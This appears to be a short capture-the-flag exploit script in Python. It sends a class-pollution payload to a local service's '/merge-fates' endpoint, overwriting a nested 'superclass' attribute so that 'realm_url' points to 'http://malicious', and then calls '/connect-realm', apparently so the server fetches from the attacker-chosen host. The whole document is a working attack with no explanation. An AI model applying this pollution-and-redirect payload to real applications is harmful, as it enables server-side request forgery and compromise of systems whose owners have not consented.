import requests as r

url = "http://0.0.0.0:1337"

def update_fates(json):
    resp = r.post(f"{url}/merge-fates", json=json)
    print(resp.json())

def player_status():
    resp = r.get(f"{url}/player-status")
    print(resp.json())

def connect_realm():
    resp = r.get(f"{url}/connect-realm")
    print(resp.json())

# payload for merge-fates 
json = {
    "name": "updated2",
    "class":{"superclass":{"realm_url":"http://malicious"}},
}

update_fates(json)
player_status()
connect_realm()